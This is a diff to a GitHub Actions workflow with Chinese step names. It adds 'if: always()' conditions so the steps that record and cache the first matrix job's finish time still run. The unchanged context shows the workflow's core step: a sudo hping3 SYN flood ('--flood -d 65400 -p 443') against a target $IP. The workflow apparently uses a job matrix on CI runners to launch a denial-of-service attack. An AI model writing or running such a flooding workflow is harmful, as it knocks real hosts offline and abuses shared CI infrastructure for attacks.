@@ -95,6 +95,7 @@ jobs:
           sudo timeout $TIMEOUT hping3 -S --flood -V -d 65400 -p 443 -s 1000-65535 $IP || true
 
       - name: 再次检查首个job完成时间
+        if: always()
         id: double_check
         uses: actions/cache/restore@v4
         with:
@@ -102,11 +103,11 @@ jobs:
           key: matrix-first-finished-${{ github.run_id }}
 
       - name: 保存首个job完成时间
-        if: steps.double_check.outputs.cache-hit != 'true'
+        if: always() && steps.double_check.outputs.cache-hit != 'true'
         run: date +%s > matrix_first_finished_time.txt
 
       - name: 缓存首个job完成时间
-        if: steps.double_check.outputs.cache-hit != 'true'
+        if: always() && steps.double_check.outputs.cache-hit != 'true'
         uses: actions/cache/save@v4
         with:
           path: matrix_first_finished_time.txt
